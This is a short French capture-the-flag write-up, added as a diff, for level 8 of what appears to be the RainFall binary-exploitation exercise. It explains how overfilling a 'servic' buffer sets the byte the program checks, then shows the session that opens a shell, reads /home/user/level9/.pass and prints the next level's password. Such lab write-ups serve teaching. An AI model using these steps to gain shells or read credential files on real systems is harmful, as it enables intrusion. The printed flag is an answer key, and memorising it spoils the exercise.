@@ -1,0 +1,17 @@
+Pour ce level, pas beaucoup besoin de reflechir, seulement de la decompilation.
+Une fois le code decompiler, il suffit de regarder la foret de if pour comprendre
+le fonctionnement du programme. Le if qui lance le shell va aller checker le 32eme
+caractere de la variable qui contient auth, seulement auth fait au max 30 char
+donc on va aussi remplir service (que lon doit ecrire servic dailleurs) qui sera
+stocke derriere auth si on fait les commandes dans le bon sens pour pouvoir remplir
+ladresse p1(adresse de auth)+32. Et voici donc la resolution du level:
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth dwqdqw
+0x804a008, (nil)
+servic dwqdwqdwqdwqdwdqwdwqdwqdwqdqwdwqdwqdwq
+0x804a008, 0x804a018
+login
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
